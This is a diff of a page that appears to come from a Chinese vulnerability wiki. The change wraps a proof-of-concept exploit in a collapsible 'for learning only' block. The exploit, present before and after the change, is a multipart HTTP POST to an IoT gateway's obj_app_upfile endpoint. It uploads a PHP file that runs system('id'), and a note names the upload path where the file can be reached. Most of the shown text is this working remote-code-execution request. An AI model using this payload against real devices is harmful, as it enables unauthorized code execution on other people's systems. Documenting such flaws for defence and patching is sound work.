@@ -39,8 +39,10 @@ fid="1Lh1LHi6yfkhiO83I59AYg=="
 
 ![image-20230828164714010](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828164714010.png)
 
-```
-POST /?g=obj_app_upfile HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /?g=obj_app_upfile HTTP/1.1
 Host: 
 Accept: */*
 Accept-Encoding: gzip, deflate
@@ -56,7 +58,7 @@ Content-Disposition: form-data; name="MAX_FILE_SIZE"
 Content-Disposition: form-data; name="upfile"; filename="vulntest.php"
 Content-Type: text/plain
 
-<?php system("id");unlink(__FILE__);?>
+&lt;?php &#115;ystem("id");unlink(__FILE__);?&gt;
 
 ------WebKitFormBoundaryJpMyThWnAxbcBBQc
 Content-Disposition: form-data; name="submit_post"
@@ -66,8 +68,9 @@ obj_app_upfile
 Content-Disposition: form-data; name="__hash__"
 
 0b9d6b1ab7479ab69d9f71b05e0e9445
-------WebKitFormBoundaryJpMyThWnAxbcBBQc--
-```
+------WebKitFormBoundaryJpMyThWnAxbcBBQc--</code></pre>
+
+</details>
 
 默认上传路径 /secgate/webui/attachements/ ， 访问 attachements/xxx.php 文件
 
